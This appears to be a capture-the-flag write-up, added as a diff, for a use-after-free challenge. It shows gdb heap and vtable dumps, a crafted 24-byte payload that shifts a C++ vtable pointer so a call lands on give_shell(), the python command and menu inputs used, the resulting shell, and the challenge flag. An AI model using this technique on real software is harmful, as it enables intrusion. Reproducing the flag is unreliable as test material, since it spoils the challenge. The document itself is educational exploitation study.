@@ -1,0 +1,56 @@
+#GOT x/nxg addr FROM ANOTHER SOLUTION, ACCIDENTALLY USED A BUFFER THE SIZE OF 20 INSTEAD OF 0X20 AND NEEDED HELP TO FIGURE IT OUT
+
+prequisites:
+1) heap is organized with blocks/chunks, when allocating memory priority is a) already freed block (BIG ENOUGH) b) new from existing heap c) new heap
+2) vtable holds the addresses of each virtual (dynamically figured out) function of a class, address of vtable of instance of class is added 
+by compiler as another attribute of the class (can be seen in chunk)
+
+solution:
+bug is when using 1 after 3, when looking at the relevant chunk of Man after new Man(...):
+0x1cb72d0:      0x0000000000000000      0x0000000000000021  -- not important
+0x1cb72e0:      0x0000000000401570      0x0000000000000019  -- vtable address, age (0x19 = 25 = age of Jack)
+0x1cb72f0:      0x0000000001cb72c8      0x000000000000ed11  -- not important
+
+vtable:
+x/6xg 0x0000000000401570
+0x401570 <vtable for Man+16>:   0x000000000040117a      0x00000000004012d2  -- address of give_shell() (FIRST IN VTABLE), address of introduce (SECOND IN VTABLE)
+0x401580 <vtable for Human>:    0x0000000000000000      0x00000000004015f0
+0x401590 <vtable for Human+16>: 0x000000000040117a      0x0000000000401192
+
+because introduce is second and giveshell is first:
+current vtable: giveshell, introduce
+current vtable - 0x8: earlier bytes (first now, will be interpreted as giveshell), giveshell (second now, will be interpreted as introduce), introduce
+
+need to:
+1) allocate Men and Woman
+2) free their memory blocks from heap
+3) override the vtable address for Man from the original to the original - 0x8
+(when introduce is called it will actually call the now second function - giveshell)
+#will need to call 2 twice as the top of the heap has woman first (allocated later = at the higher top = will be reallocated first)
+# saw this by trying with one call for 2, still does segmentation fault but after 2 it works
+4) call one again which calls introduce (now give_shell) and get shell
+
+# the current size of data provided for the block of Man/Woman is 0x18 (checked in visual studio), rounded to 0x20 for 8 byte allignement
+after sending a specific buffer that size (abcdefghijklmnopqrstuvw + file end) i saw that:
+a) first 8 bytes written will overwrite the vtable address (from right to left - little endian)
+b) second 8 bytes written will overwrite the age (not important for now, but i still recovered the original)
+c) third 8 bytes written will overwrite another parameter (also recovered it as the buffer needed to get to 0x18/24 bytes)
+
+after Man is allocated 0x0000000000401570 is the original vtable address so the overwritten value should be 0x0000000000401568
+ (\x68\x15\x40 + \x00 * 5)
+
+buffer: '\x68\x15\x40' + '\x00' * 5 + '\x19' + '\x00' * 7 + '\xc8\x72\xcb\x01' + '\x00' * 4
+command to save buffer in file: 
+python -c "print('\x68\x15\x40' + '\x00' * 5 + '\x19' + '\x00' * 7 + '\xc8\x72\xcb\x01' + '\x00' * 4)" > tryflag
+#saved it in /tmp in server so i could read it and write into it
+./uaf 24 tryflag
+1
+3
+2
+2
+ whoami
+uaf
+$ cat flag
+flag: "yay_f1ag_aft3r_pwning"
+
+
